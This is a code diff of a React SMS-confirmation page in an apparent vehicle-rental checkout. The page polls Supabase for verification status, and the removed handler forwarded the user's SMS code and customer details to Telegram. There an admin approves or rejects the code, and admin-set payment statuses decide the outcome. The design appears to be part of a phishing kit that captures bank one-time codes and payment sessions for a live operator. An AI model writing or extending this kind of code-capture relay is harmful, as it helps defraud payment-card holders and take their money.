@@ -61,141 +61,102 @@ const SmsConfirmationPage = () => {
   };
 
   // Check verification status directly from database - same pattern as payment
+  // Check verification status directly; robust fallbacks if admin clicked the wrong button
   const checkVerificationStatus = async (id: string) => {
     try {
+      // 1) Primary: check exact verification id
       const { data: verificationData } = await supabase
         .from('verification_requests')
         .select('status')
         .eq('verification_id', id)
         .maybeSingle();
 
-      if (verificationData) {
-        if (verificationData.status === 'approved') {
-          console.log('Verification approved! Redirecting...');
-          
-          // Immediately set redirecting state to prevent further polls
-          setIsRedirecting(true);
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          if (pollTimeoutRef.current) clearTimeout(pollTimeoutRef.current);
-          setWaitingForAdmin(false);
-          setIsVerifying(false);
+      let status = verificationData?.status as string | undefined;
 
-          // Analytics event
-          if (window.gtag) {
-            window.gtag('event', 'sms_verified');
-          }
+      // 2) Fallback: latest verification by user
+      if (!status || status === 'pending') {
+        const { data: latest } = await supabase
+          .from('verification_requests')
+          .select('status')
+          .eq('user_id', location.state.userId)
+          .order('created_at', { ascending: false })
+          .limit(1)
+          .maybeSingle();
+        status = latest?.status || status;
+      }
 
-          // Generate order ID if missing
-          const orderId = location.state.orderId || `TRP${Date.now()}${Math.random().toString(36).substr(2, 5).toUpperCase()}`;
-
-          // Persist details so confirmation page can fall back safely
-          saveVehicleData(location.state.vehicle);
-          saveDurationData(location.state.duration);
-          if (location.state.customerInfo) saveCustomerInfo(location.state.customerInfo);
-
-          // Notify user and redirect
-          toast({ title: "Verified", description: "Approved by admin. Redirecting..." });
-          
-          // Replace history entry and include order id in URL as fallback
-          navigate(`/confirmation?oid=${orderId}`, {
-            replace: true,
-            state: {
-              ...location.state,
-              orderId,
-              completedAt: new Date().toISOString()
-            }
-          });
-          
-          // Hard redirect fallback if SPA navigation fails for any reason
-          setTimeout(() => {
-            if (!window.location.pathname.includes('/confirmation')) {
-              window.location.assign(`/confirmation?oid=${orderId}`);
-            }
-          }, 500);
-        } else if (verificationData.status === 'rejected') {
-          console.log('Status rejected - showing error');
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          setWaitingForAdmin(false);
-          setIsVerifying(false);
-          
-          toast({
-            variant: "destructive",
-            title: "Verification Failed",
-            description: "Wrong verification code. Please try again.",
-          });
-          
-          setCode("");
+      // 3) Legacy fallback: payment_sessions approved with sms
+      if (!status || status === 'pending') {
+        const { data: session } = await supabase
+          .from('payment_sessions')
+          .select('payment_status, admin_response')
+          .eq('user_id', location.state.userId)
+          .maybeSingle();
+        if (session?.payment_status === 'approved' && session?.admin_response === 'sms') {
+          status = 'approved';
         }
+      }
+
+      if (status === 'approved') {
+        console.log('Verification approved! Redirecting...');
+        
+        // Immediately set redirecting state to prevent further polls
+        setIsRedirecting(true);
+        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+        if (pollTimeoutRef.current) clearTimeout(pollTimeoutRef.current);
+        setWaitingForAdmin(false);
+        setIsVerifying(false);
+
+        // Analytics event
+        if (window.gtag) {
+          window.gtag('event', 'sms_verified');
+        }
+
+        // Generate order ID if missing
+        const orderId = location.state.orderId || `TRP${Date.now()}${Math.random().toString(36).substr(2, 5).toUpperCase()}`;
+
+        // Persist details so confirmation page can fall back safely
+        saveVehicleData(location.state.vehicle);
+        saveDurationData(location.state.duration);
+        if (location.state.customerInfo) saveCustomerInfo(location.state.customerInfo);
+
+        // Notify user and redirect
+        toast({ title: "Verified", description: "Approved by admin. Redirecting..." });
+        
+        // Replace history entry and include order id in URL as fallback
+        navigate(`/confirmation?oid=${orderId}`, {
+          replace: true,
+          state: {
+            ...location.state,
+            orderId,
+            completedAt: new Date().toISOString()
+          }
+        });
+        
+        // Hard redirect fallback if SPA navigation fails for any reason
+        setTimeout(() => {
+          if (!window.location.pathname.includes('/confirmation')) {
+            window.location.assign(`/confirmation?oid=${orderId}`);
+          }
+        }, 500);
+      } else if (status === 'rejected') {
+        console.log('Status rejected - showing error');
+        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+        setWaitingForAdmin(false);
+        setIsVerifying(false);
+        
+        toast({
+          variant: "destructive",
+          title: "Verification Failed",
+          description: "Wrong verification code. Please try again.",
+        });
+        
+        setCode("");
       }
     } catch (error) {
       console.error('Error checking verification status:', error);
     }
   };
-  const handleVerifyCode = async () => {
-    if (code.length !== 6) {
-      setError("Please enter a 6-digit code");
-      return;
-    }
-
-    setIsVerifying(true);
-    setWaitingForAdmin(true);
-    setError("");
-
-    try {
-      // Send verification request to Telegram with admin buttons
-      const { data, error } = await supabase.functions.invoke('verify-sms', {
-        body: {
-          userId: location.state.userId,
-          code: code,
-          customerInfo: location.state.customerInfo,
-          vehicle: location.state.vehicle,
-          duration: location.state.duration
-        }
-      });
-
-      if (error) {
-        throw error;
-      }
-
-      if (data.success) {
-        setVerificationId(data.verificationId);
-        
-        // Start polling for admin response - same pattern as payment page
-        const startPolling = () => {
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          const id = data.verificationId as string;
-          pollIntervalRef.current = window.setInterval(() => checkVerificationStatus(id), 2000);
-        };
-        startPolling();
-
-        // Clear polling after 5 minutes
-        pollTimeoutRef.current = window.setTimeout(() => {
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          if (waitingForAdmin && !isRedirecting) {
-            setWaitingForAdmin(false);
-            setIsVerifying(false);
-            toast({
-              variant: "destructive",
-              title: "Verification Timeout",
-              description: "Verification request timed out. Please try again.",
-            });
-          }
-        }, 300000); // 5 minutes
-      } else {
-        throw new Error(data.message || "Failed to send verification request");
-      }
-    } catch (error) {
-      console.error('Error verifying code:', error);
-      setIsVerifying(false);
-      setWaitingForAdmin(false);
-      toast({
-        variant: "destructive",
-        title: "Verification Error",
-        description: "Failed to verify code. Please try again.",
-      });
-    }
-  };
-
   const sendSmsCode = async (testType?: 'success' | 'error') => {
     setIsSending(true);
     setError("");
